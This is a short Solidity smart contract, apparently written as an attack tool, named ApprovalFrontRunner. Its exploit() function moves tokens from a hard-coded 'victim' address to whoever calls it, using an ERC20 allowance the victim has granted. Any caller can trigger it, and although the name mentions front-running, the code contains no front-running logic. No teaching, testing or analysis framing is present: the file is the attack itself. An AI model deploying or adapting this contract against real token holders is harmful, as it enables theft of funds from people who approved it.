// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract ApprovalFrontRunner {
    IERC20 public token;
    address public victim;

    constructor(address _token, address _victim) {
        token = IERC20(_token);
        victim = _victim;
    }

    function exploit(uint256 amount) external {
        token.transferFrom(victim, msg.sender, amount);
    }
}
